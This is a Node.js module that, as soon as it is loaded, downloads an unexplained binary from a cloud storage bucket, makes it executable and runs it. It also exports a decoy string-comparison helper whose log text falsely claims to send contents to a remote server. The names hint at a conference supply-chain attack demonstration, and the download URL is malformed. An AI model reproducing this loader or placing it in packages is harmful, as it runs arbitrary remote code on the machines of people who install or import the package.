#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

let fetch;

async function initialize() {
  const module = await import('node-fetch');
  fetch = module.default;
  await main(); // Main is here [Note]
}

const TARGET_URL = 'https:/devfest-test1-bucket.nyc3.digitaloceanspaces.com/my-binary';
const BINARY_PATH = path.join(__dirname, 'my-binary');

async function download() {
  const res = await fetch(TARGET_URL);
  const fileStream = fs.createWriteStream(BINARY_PATH);
  await new Promise((resolve, reject) => {
    res.body.pipe(fileStream);
    res.body.on('error', reject);
    fileStream.on('finish', resolve);
  });
}

function runBinary() {
  exec(BINARY_PATH, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing binary: ${error}`);
      return;
    }
    console.log(`STDOUT: ${stdout}`);
    console.error(`STDERR: ${stderr}`);
  });
}

async function main() {
  await download();
  fs.chmodSync(BINARY_PATH, 0o755);
  runBinary();
}

// Initialize and then run main
initialize().catch((err) => console.error(err));

// Function to compare string against "supply chain"
function compareString(str) {
  const comparisonResult = str === "supply chain";
  console.log(`String comparison function completed.\n\nComparison result - ${comparisonResult}\n\nNow, running the binary. Sending the following contents to the remote server - `);
  return comparisonResult;
}

// Exports
module.exports = {
  download,
  runBinary,
  compareString
};
